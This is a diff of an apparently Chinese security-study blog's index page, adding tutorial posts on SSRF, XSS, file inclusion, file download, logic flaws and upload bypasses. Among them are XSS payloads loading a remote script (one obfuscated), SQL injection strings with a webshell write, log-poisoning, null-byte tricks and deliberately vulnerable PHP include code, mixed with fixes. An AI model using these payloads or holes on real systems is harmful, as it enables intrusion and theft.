@@ -61,9 +61,35 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-CSRF" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-安全配置与中间件漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/08/30/CSRF/" class="article-date">
+    <a href="/2016/09/21/安全配置与中间件漏洞/" class="article-date">
+  <time datetime="2016-09-21T12:59:31.963Z" itemprop="datePublished">2016-09-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/09/21/安全配置与中间件漏洞/" data-id="citl6rit60000d0qvzrpxqu1t" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-SSRF" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/SSRF/" class="article-date">
   <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
 </a>
     
@@ -75,7 +101,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/30/CSRF/">CSRF</a>
+      <a class="article-title" href="/2016/08/30/SSRF/">SSRF</a>
     </h1>
   
 
@@ -83,12 +109,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><br></p>
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
+        <p>SSRF是指服务端请求伪造，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<p>成因：大多服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。比如从目标地址获取网页文本内容、加载指定地址的图片、下载等。</p>
+<p>PHP相关函数：<br>    file_get_content()<br>    curl-curl_exec()<br>    socket-fsockopen()</p>
+<p>利用：<br>    可以对外网、服务器所在的内网、本地进行端口扫描，湖区一些服务的banner信息。<br>    攻击运行在内网或本地的应用程序。<br>    对内网web应用进行指纹识别，通过访问默认文件实现。<br>    利用file协议读取本地文件等</p>
+<p>挖掘：<br>    从web功能上找<br>    从URL关键字查找</p>
+<p>验证：<br>    直接右键图片，在新窗口打开图片，如果浏览器上的URL地址是<a href="http://www.baidu.com/img/bd_XIAOXIN.jpg,说明不存在SSRF漏洞。" target="_blank" rel="external">http://www.baidu.com/img/bd_XIAOXIN.jpg,说明不存在SSRF漏洞。</a><br>    使用burpsuite等抓包工具来判断，首先SSRF是由服务端发起的请求。因此在加载图片时，是由服务端发起的。所以本地浏览器的请求中不存在图片的请求。</p>
+<p>防御：<br>    通常有以下5个思路：<br>    1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。<br>    2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。<br>    3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。<br>    4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。<br>    5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/30/CSRF/" data-id="cit8bn8290000zcqvo8z9xj2y" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/30/SSRF/" data-id="citl6rium0001d0qvyomi0z9v" class="article-share-link">Share</a>
       
       
     </footer>
@@ -123,10 +155,19 @@
         <p>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表的英文缩写混淆，故将跨站脚本攻击缩写为XSS。攻击者往web页面里插入恶意的html代码，当用户浏览该网页时候，嵌入该网页的html代码会被执行，从而达到攻击用户的目的。其重点已经不在’跨站’而是’脚本’,主要有两个：JavaScript和ActionScript</p>
 <p>产生原因：<br>    网页提供我们输入信息的表单，同时可以把我们输入的信息输出到网页上。我们输入的是一个字符串，但这个字符串也可以是标记语言格式的字符串。浏览器新人服务器返回的标记语言格式的字符串(html源代码)，所以直接渲染显示到浏览器上形成可视化界面。我们输入的恶意的标记语言格式的字符串达到攻击的目的。</p>
 <p>出现XSS：url的参数回显到网页上、form表单提交的内容出现在网页上，如昵称、邮件、简介、留言板等</p>
-<p>危害：<br>    可以利用XSS获取用户的Cookie、改变网页内容、URL跳转、有局限性的键盘记录。</p>
-<p>利用：<br>    1、反射型XSS<br>    2、储存型XSS<br>    3、DOM XSS：代码不需要服务器解析响应的直接参与，触发XSS靠的是浏览器的DOM解析，可以认为完全是客户端的事<br>    4、flash XSS：利用网页上的flash文件的缺陷来执行js脚本，一般是反射性XSS<br>    5、m XSS：突变XSS，主要用于过滤的绕过。</p>
-<p>发现XSS：<br>    1、反射型XSS：url参数中的值，能够回显到返回的html中，url的参数值没有被过滤或者是过滤不严格。<br>    2、储存型XSS：可以提交内容，提交内容能被管理员或其他用户查看，提交的内容没有被过滤或者过滤不严格。</p>
-<p>过滤：<br>    前端过滤、输入过滤、输出过滤。<br>    输入过滤：服务器脚本接收用户提交的数据后，写入到数据库中，之间对数据进行过滤，称之为输入过滤，一般采用黑白名单过滤，或者是对提交的数据进行html实体编码<br>    输出过滤：服务器脚本在显示数据时，需要从数据库中读取数据再返回数据包，之间进行过滤，称之为输出过滤。一般采用黑白名单，或对数据进行html实体编码。<br>    前端绕过：可以用burpsuite拦截数据包，改包绕过。</p>
+<p>危害：<br>    可以利用XSS获取用户的Cookie、修改网页内容、URL跳转、XSS蠕虫、有局限性的键盘记录等。</p>
+<p>类型：<br>    1、反射型XSS<br>    2、储存型XSS<br>    3、DOM XSS：代码不需要服务器解析响应的直接参与，触发XSS靠的是浏览器的DOM解析，可以认为完全是客户端的事<br>    4、flash XSS：利用网页上的flash文件的缺陷来执行js脚本，一般是反射性XSS<br>    5、m XSS：突变XSS，主要用于过滤的绕过。</p>
+<p>发现XSS：<br>    1、反射型XSS：url参数中的值，能够回显到返回的html中，url的参数值没有被过滤或者是过滤不严格。<br>    2、储存型XSS：可以提交内容，提交内容能被管理员或其他用户查看，提交的内容没有被过滤或者过滤不严格。<br>场景利用：</p>
+<pre><code>1、在标签内,输出无需构造，直接控制变量就可以造成XSS漏洞，比如:
+&lt;div&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/div&gt;
+2、在属性内：
+&lt;div class=&quot;${xss}&quot;&gt;&lt;/div&gt;
+&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;${xss}&quot; /&gt;
+&lt;a herf=&quot;${xss}&quot;&gt;hello&lt;/a&gt;
+这时候仅仅需要闭合标签就可以继续xss操作：
+&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot; /&gt;
+&lt;a herf=&quot;javascript:alert(/xss/)&quot;&gt;hello&lt;/a&gt;
+</code></pre><p>过滤：<br>    前端过滤、输入过滤、输出过滤。<br>    输入过滤：服务器脚本接收用户提交的数据后，写入到数据库中，之间对数据进行过滤，称之为输入过滤，一般采用黑白名单过滤，或者是对提交的数据进行html实体编码（PHP中提供了htmlspecialchars()、htmlentities()函数可以把一些预定义的字符转换为HTML实体）。<br>    输出过滤：服务器脚本在显示数据时，需要从数据库中读取数据再返回数据包，之间进行过滤，称之为输出过滤。一般采用黑白名单，或对数据进行html实体编码。<br>    前端绕过：可以用burpsuite拦截数据包，改包绕过。</p>
 <p>绕过方式：<br>    &lt;&gt;被过滤，一般很难触发XSS漏洞，除非输入内容直接输入到”script \script”标签内。<br>    script被过滤 可以用img svg标签替换。特殊字符被过滤，编码ascii 16进制</p>
 <p>修复：<br>    1、对用户的输入进行严格的过滤，一般为基于黑白名单过滤。白名单过滤的防御效果更好，对于用户在白名单之外的输入，直接忽略。构造白名单的过程中需要尽量保证在不影响用户体验的同时，尽可能杜绝一切不必要的输入。<br>    2、Flash XSS修复需要对相应的flash进行修改或升级替换。<br>    3、在cookie中加入httponly属性可以在一定程度上保护用户的cookie，减少出现XSS时的损失。</p>
 <p>示例代码：</p>
@@ -134,12 +175,12 @@
 &lt;img src=xonerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&apos;&quot;;&gt;
 &lt;svg onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://b.ioio.pub/xss/probe.js&gt;
 &lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,112,114,111,98,101,46,106,115)) &gt;
-</code></pre><p><br></p>
-<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
+</code></pre><p>javascript:alert(docunmet.cookie)</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/30/XSS/" data-id="cit8bn82o0001zcqvzlhibk63" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/30/XSS/" data-id="cit8bqrk70002ncqvl5aa0ps0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -149,9 +190,9 @@
 
 
   
-    <article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/08/30/SQL注入/" class="article-date">
+    <a href="/2016/08/30/文件包含漏洞/" class="article-date">
   <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
 </a>
     
@@ -163,7 +204,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/30/SQL注入/">SQL 注入</a>
+      <a class="article-title" href="/2016/08/30/文件包含漏洞/">文件包含漏洞</a>
     </h1>
   
 
@@ -171,70 +212,113 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>sql注入是一种把sql代码插入到url或web表单请求的参数中，之后再将这些参数传递给后台的SQL服务器解析并执行。最终达到欺骗服务器执行恶意的sql代码。</p>
-<p>产生原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。</p>
-<p>利用：可以利用sql注入获取数据包括用户数据后台管理账号密码等，如果有读写权限并知道网站的绝对路径，还可以load_file()读取文件内容、into outfile 写入webshell进行攻击，</p>
-<p>利用手法：</p>
-<ul>
-<li>url判断注入：<pre><code>and 1=1 / and 1=2 回显页面不同(整型判断)
-单引号‘显示数据库错误信息(整型、字符串类型判断) 
-+1/-1回显上个页面（整型判断）
-and sleep(5) （判断网页返回时间）
-</code></pre></li>
-<li>读取文件： select load_file(‘/etc/passwd’)<pre><code>select load_file(&apos;D://xxxxx//phpstudy//WWW//1.txt&apos;)
-</code></pre></li>
-<li>写入：select ‘&lt;?php phpinfo(); ?&gt;’ into outfile ‘D://xxxxx//phpstudy//WWW//121.php’<pre><code>select &apos;&lt;?php phpinfo(); ?&gt;&apos; INTO OUTFILE &apos;/var/www/html/webshell.php&apos;;
-</code></pre></li>
-<li>获取绝对路径：php报错显示绝对路径、load_file()读取配置文件、phpinfo.php </li>
-</ul>
-<p>根据sql数据类型分类：</p>
-<ul>
-<li>字符串类型注入和整型注入、搜索类型注入</li>
-</ul>
-<p>根据注入语法注入：</p>
-<ul>
-<li>可联合查询注入：有显示位<pre><code>order by 判断列数
-union 1，2，3 判断显示位
-</code></pre>  例：<pre><code>?id=-1&apos;  union select 1,2,(select versraion()) --+
-?id=-1&apos;  union select 1,2,(select  group_concat(distinct table_schema) from information_schema.columns) --+                   
-</code></pre></li>
-<li><p>布尔型注入:页面存在注入，没有显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断来sql注入 </p>
-<pre><code>exists():检查子查询是否有返回值，返回True或False
-ascii():返回字符串str的最左边字符的ascii代码值，
-substr(string,numstart,numlength):
-</code></pre><p>  例：<br>  判断有多少个数据库：</p>
-<pre><code>?id=1&apos; and ((select count(distinct table_schema) from information_schema.columns)&gt;8) --+
-</code></pre><p>  查看第一个数据库字段的长度：</p>
-<pre><code>?id=1&apos; and (select length((select distinct table_schema from information_schema.columns limit 0,1))&gt;17)
-</code></pre><p>  查看第一个数据库的第一个字符的ascii码：</p>
-<pre><code>?id=1&apos; and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))&gt;104) --+
-</code></pre></li>
-</ul>
-<ul>
-<li>报错注入：有报错信息 mysql_error()<pre><code>count(*)
-concat()
-(floor(rand(0)*2))a
-group by a
-</code></pre>  例：<br>  查看版本信息：<pre><code>?id=1&apos; union select 1,count(*),concat(version(),0x7e,floor(rand(0)*2))x from information_schema.columns group by x --+
-</code></pre>  查看有多少个库：<pre><code>?id=1&apos; union select 1,count(*),concat((select count( distinct table_schema) from information_schema.columns),0x7e,floor(rand(0)*2))x from information_schema.columns group by  x--+
-</code></pre>  查询数据库名(limit)<pre><code>(select distinct table_schema from information_schema.columns limit 1,1)
-</code></pre></li>
-</ul>
-<ul>
-<li>可多语句查询注入：<pre><code>sqlserver数据库
-例：http://hello.com/view?id=1;update t1 set content =&apos;aaaaaaaaa&apos;
-</code></pre></li>
-<li>基于时间延迟注入：<pre><code>sleep()
-</code></pre></li>
-<li>偏移注入、宽字节注入、二次注入</li>
-</ul>
-<p>防御：<br>     1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。<br>     2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。<br>     3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>     4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>     5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装<br>     6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFTSCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</p>
-<p><br></p>
+        <p>文件包含漏洞的产生原因是在通过引入文件时，引入的文件名用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就有可能导致意外的文件泄露和恶意代码的注入。</p>
+<p>漏洞代码示例：<br>    if(isset($_GET[page])){<br>    include ($_GET[page]);<br>    }else{<br>    include (“index.php”);<br>    }</p>
+<p>触发条件：<br>    Web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件<br>    用户能够控制该动态变量</p>
+<p>PHP常见包含文件函数<br>    include() include_once() 发生错误只给出警告，继续执行，once重复调用只执行一次。<br>    require() require_once() 发生错误会输出错误信息，并终止脚本的运行。<br>    require()程序一运行就立即调用文件，include()执行到该函数才调用。</p>
+<p>本地包含<br>上传图片，包含图片getshell；<br>读文件，读PHP文件(index.php?file=php://filter/read=convert.base64-encode/resource=ctf.php)</p>
+<p>包含日志文件getshell<br>    首先找到日志文件存放位置：<br>        文件包含漏洞去读取apache配置文件<br>        /etc/init.d/httpd<br>        /etc/httpd/conf/httpd.conf<br>        默认位置/var/log/httpd/access_log<br>    在日志文件中插入php代码（使用burp改包把php代码插入到get请求部分或者user-agent部分）</p>
+<p>包含data://或php://input等伪协议（需要allow_url_include=On）</p>
+<p>示例代码：<br>    include($_GET[page]);<br>        123.206.9.45/inc.php?cc=img.php<br>    include(“./action/“.$_GET[page]);<br>        123.206.9.45/inc.php?cc=../img.php<br>    include(“./action/“.$_GET[page].”.php”);<br>        123.206.9.45/inc.php?cc=../img.php%00<br>        (%00截断需要magic_quotes_gpc=off，php版本小于5.3.4)<br>magic_quotes_gpc=On时，<br>    单引号(‘) 双引号(“) 反斜杠(\) NULL(%00)会被转义。</p>
+<p>远程包含：包含远程非php文件(不被解析的php文件)<br>    php.ini的配置选项allow_url_fopen和allow_url_include为ON的话，可以加载远程文件，这种漏洞称之为远程文件包含漏洞。（/etc/php.ini）</p>
+<p>漏洞挖掘：<br>    web漏洞扫描器扫描，常见web漏洞扫描器都支持文件包含漏洞的检测</p>
+<p>修复：<br>    PHP中可以使用open_basedir配置限制访问<br>    （/etc/php.ini）<br>    路径限制：过滤. / \<br>    禁止服务器远程文件包含<br>    php.ini的配置选项allow_url_fopen和allow_url_include为Off<br>    严格判断包含中的参数是否可控，<br>    包含文件验证：基于白名单<br>    尽量不使用动态包含。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/30/SQL注入/" data-id="cit8bn82w0002zcqvt8xud2a7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/30/文件包含漏洞/" data-id="citl6riw10008d0qvk621xwko" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-任意文件查看与下载漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/任意文件查看与下载漏洞/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/任意文件查看与下载漏洞/">任意文件查看与下载漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>成因：<br>    网站的业务需求，提供文件查看或下载功能，对用户查看或下载的文件不做限制，就能够查看或下载任意文件。可以是源代码文件、敏感文件等。</p>
+<p>文件读取示意代码：<br>    &lt;?php<br>    $filename = $_GET[‘xx’];<br>    echo file_get_contents($filename);<br>    ?&gt;<br>    $filename没有经过校验，或者校验不严格，用户可控制这个变量读取任意文件。造成了任意文件读取漏洞。</p>
+<p>任意文件下载示意代码：<br>    &lt;?php<br>    $filename = $_GET[f];<br>    header(‘Content-Type: image/gif’);<br>    header(‘Content-Disposition: attachment; filename=’.$filename);<br>    header(‘Content-Length: ‘.filesize($filename));<br>    readfile($filename);<br>    ?&gt;<br>    $filename没有经过校验，或者校验不严格，用户可控制这个变量读取任意文件。造成了任意文件下载漏洞。</p>
+<p>google search：<br>    inurl:”readfile.php?file=”<br>    inurl:”download.php?file=”</p>
+<p>漏洞危害：<br>    下载服务器任意文件，包含脚本代码文件，系统敏感文件等<br>    进一步代码审计，查找更堵可利用的代码。</p>
+<p>漏洞挖掘：<br>    从url上：<br>        readfile.php?file=<strong><em>.txt<br>        download.php?file=</em></strong>.rar<br>    通过Web扫描器扫描发现漏洞。</p>
+<p>文件读取or文件包含：<br>    如果是文件读取，会显示php文件源代码。<br>    文件包含，会直接解析php文件。</p>
+<p>修复方案：<br>    过滤.(点)<br>    正则判断用户输入的参数的格式，看输入的是否合法。<br>    php.ini配置open_basedir        /etc/init.d/php-fpm restart </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/任意文件查看与下载漏洞/" data-id="citl6rivz0007d0qvgsle7qaa" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-逻辑漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/逻辑漏洞/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/逻辑漏洞/">逻辑漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>逻辑错误漏洞是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误。通俗的讲：一个系统的功能太多后，程序开发人员就难以思考全面，对某些地方可能有遗漏，或者未能正确处理，从而导致逻辑漏洞。逻辑漏洞可以是说程序开发人员的思路错误、程序开发人员的逻辑存在漏洞。</p>
+<p>逻辑漏洞只出现于业务流程中，也就是说，网站的任何部分都有可能存在逻辑漏洞。</p>
+<p>挖掘逻辑漏洞时操作步骤如下：<br>    发现网站所提供的功能模块。如修改密码、找回密码、修改个人资料等功能。<br>    针对具体的功能确定业务流程，详细划分具体步骤。<br>    拦截HTTP/HTTPS请求，分析其参数的含义。<br>    修改参数值，尝试触发逻辑漏洞。</p>
+<p>简单来说，挖掘逻辑漏洞有两个重点，就是业务流程和http/https请求篡改。</p>
+<p>漏洞分类:<br>    密码重置逻辑漏洞：邮箱弱token 短信验证码暴力破解 本地验证 找回密码凭证出现在URL中 密码找回凭证出现子啊页面html源代码中 HTTP返回包中包含验证信息 </p>
+<p>多线程条件竞争漏洞：是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此如果并发处理不当或者相关操作逻辑顺序设计的不合理时，将会导致多种安全问题的发生。</p>
+<p>文件上传：<br>    上传文件、多线程访问上传的恶意脚本文件(在上传完成和安全检查完成并删除他的间隙)、生成一个新的webshell、删除不安全的文件<br>数据库多线程操作：</p>
+<p>修复：<br>    对重要操作进行加锁。</p>
+<p>支付逻辑漏洞<br>    支付过程中可直接修改数据包中的支付金额。</p>
+<pre><code>没有对购买数量进行负数限制
+</code></pre><p>修复方案：<br>    对传递的金钱、数量等对最后支付金额会产生影响的所有参数做签名，并且注意签名的算法不可被猜测到。这样攻击者修改数据的时候验证便不会通过。同时注意对已经交易的订单不可重复而造成重复重置的漏洞。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/逻辑漏洞/" data-id="citl6rivx0006d0qvoi2qcc3z" class="article-share-link">Share</a>
       
       
     </footer>
@@ -366,7 +450,7 @@ group by a
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/30/注入练习/" data-id="cit8bn83m0006zcqvdhwl4006" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/30/注入练习/" data-id="cit8bqrl20006ncqv2fer5k7j" class="article-share-link">Share</a>
       
       
     </footer>
@@ -376,10 +460,10 @@ group by a
 
 
   
-    <article id="post-read_sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/08/16/read_sqlmap/" class="article-date">
-  <time datetime="2016-08-16T07:50:28.000Z" itemprop="datePublished">2016-08-16</time>
+    <a href="/2016/08/30/文件上传漏洞/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
 </a>
     
   </div>
@@ -390,7 +474,7 @@ group by a
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/16/read_sqlmap/">Read_Sqlmap</a>
+      <a class="article-title" href="/2016/08/30/文件上传漏洞/">任意文件上传</a>
     </h1>
   
 
@@ -398,26 +482,141 @@ group by a
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><br><br><img src="http://123.206.9.45/sqlmap.png" alt="sqlmap安装"><br><img src="http://123.206.9.45/sqlmap2.png" alt="2"><br><br></p>
-<h3 id="Options"><a href="#Options" class="headerlink" title="Options:"></a>Options:</h3><ul>
-<li>–version 显示版本信息并退出</li>
-<li>-h，–help 显示帮助信息</li>
-<li>-v verbose 回显级别：0-6 默认为1<pre><code>0:只显示python错误以及严重的信息
-1:同时显示基本信息和警告信息
-2:同时显示debug信息
-3:同时显示注入的payload
-4:同时显示http请求
-5:同时显示http响应头
-6:同时显示http响应页面
+        <p>Web应用程序通常会有文件上传的功能，只要Web应用程序允许上传文件，就有可能存在文件上传漏洞。</p>
+<p>攻击者在利用上传漏洞时，通常会与Web容器的解析漏洞配合在一起。常见的web容器有IIS、Nginx、Apache、Tomcat等。</p>
+<p>Apache解析漏洞：<br>    一个文件名为x1.x2.x3的文件，Apache会从x3的位置往x1的位置尝试解析。如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样一直往前尝试、直到遇到一个能解析的扩展名。<br>    版本：Apache2.0.x &lt;= 2.0.59 , Apache2.2.x &lt;= 2.2.17 , Apache2.2.2 &lt;= 2.2.8 .</p>
+<p>IIS解析漏洞：<br>    解析 - test.asp/任意文件名 | test.asp;任意文件名 | 任意文件名/任意文件名.php<br>    描述 - IIS6.0 在解析 asp 格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，<br>    那么这个目录下所有的文件都会按照 asp 去解析，另一个是只要文件名中含有”.asp;”<br>    会优先按 asp 来解析<br>    IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞， 对任意文件名只要在URL<br>    后面追加上字符串”/任意文件名.php”就会按照 php 的方式去解析(IIS6.0 没测试)<br>    测试 - 测试了下面这些集成环境，都以它们的最新版本来测试，应该能覆盖所有低版本<br>    IIS6.0 (Win2003 SP2 + IIS6.0) [Success]<br>    IIS7.0 (Win2008 R1 + IIS7.0) [Success]<br>    IIS7.5 (Win2008 R2 + IIS7.5) [Success]</p>
+<p>Nginx解析漏洞：<br>    解析 - 任意文件名/任意文件名.php | 任意文件名%00.php<br>    描述 - 目前 Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php<br>    的解析漏洞，比如原本文件名是 test.jpg，可以添加为 test.jpg/x.php 进行解析攻击。<br>    还有一种是对低版本的 Nginx 可以在任意文件名后面添加%00.php 进行解析攻击<br>    测试 - 测试了下面这些环境<br>    nginx 0.5.<em> [Success]<br>    nginx 0.6.</em> [Success]<br>    nginx 0.7 &lt;= 0.7.65 [Success]<br>    nginx 0.8 &lt;= 0.8.37 [Success]<br>    这里要注意一点，对于任意文件名/任意文件名.php 这个漏洞其实是出现自 php-cgi 的漏洞。</p>
+<p>从漏洞原理来说总归有 4 类 web 应用程序解析漏洞<br>[<em>] Apache 的扩展名顺序解析漏洞<br>这个是 Apache 自身的漏洞<br>[</em>] IIS 的 asp 解析漏洞<br>这个是 IIS 自身的漏洞<br>[<em>] Nginx 的%00 解析漏洞<br>这个是 Nginx 自身的漏洞<br>[</em>] php-cgi 的默认配置漏洞<br>这类漏洞主要出现在 IIS 和 Nginx 这类以 CGI 形式调用 php 的 web 应用程序<br>而 Apache 通常是以 module 的形式去调用 php，所以很少出现这个漏洞</p>
+<p>服务器配置不当 在不需要上传的地方可以随便上传导致<br>开源编辑器上传漏洞 很多编辑器都有不同的上传漏洞<br>本地文件上传限制被绕过<br>过滤不严或被绕过 黑名单不全或者被绕过、常见一些可执行的脚本后缀：<br>                （php php2 php3 php5 phtml asp aspx ascx ashx cer jsp jspx）</p>
+<p>文件解析漏洞导致文件执行<br>文件路径截断 在上传的文件中使用一些特殊的符号，使文件被上传到服务器中时路径被截断而控制文件路径。常用的截断符：\0 ? %00 </p>
+<p>挖掘：<br>    查找上传点：图片、文件、头像等。<br>    目录、文件扫描，类似upload.php等文件<br>    目录、文件扫描，编辑器目录如eWebEditor、fckeditor、kingeditor等</p>
+<p>利用：<br>    上传点上传，上传成功，访问上传后的脚本文件。<br>    上传失败，采用过滤方法<br>    1、客户端检测绕过：<br>        先上传一个后缀正常的文件，使用burp修改后缀，forward上传成功。<br>    上传步骤：<br>    0.查看上传功能是否是调用编辑器的还是程序自己写的上传点<br>    1.看保存路径、看保存文件名  </p>
+<pre><code>1.抓包
+2.上传
+3.分析数据包
+4.分析验证
+   前端过滤，mime类型，文件内容
+1.上传一个正常的jpg
+2.在上传一个正常jpg，burp改为php（前端过滤，mime类型，文件内容）
+3.构造一个图片木马的jpg文件，图片尽量小，burp改包，后缀修改为php
+黑名单的绕过：
+    从黑名单中查找Web开发人员忽略的扩展名
+    在windows系统下，上传asp. asp空格 服务器接受文件名后，windows会自动去掉小数点和空格、
+白名单也不是完全的安全：遇到web容器的解析漏洞时:1.asp;1.jpg也能被IIS解析。
+目录验证：burp改包把默认目录改为1.asp那么上传的文件就可以被IIS解析。
+00截断：
+    1.asp空格2.jpg修改十六进制 把20(空格)改为00.
+    查看上传结果就只有1.asp
+</code></pre><p>修复方案：<br>    需要注意的:</p>
+<pre><code>1. 轻量级检测必然能绕过
+2. 检测的重点放在文件内容检测
+可以用检测脚本语言特征码的机制
+3. 路径/扩展名检测一定要用白名单
+并且注意路径的 0x00 截断攻击 (把 php 更新至最新版本即可，已经修补了这个漏洞了)
+4. 不能有本地文件包含漏洞
+5. 随时注意更新 web 应用软件
+避免被解析漏洞攻击
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/30/文件上传漏洞/" data-id="citl6rivu0005d0qv92hq967a" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/30/SQL注入/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/30/SQL注入/">SQL 注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
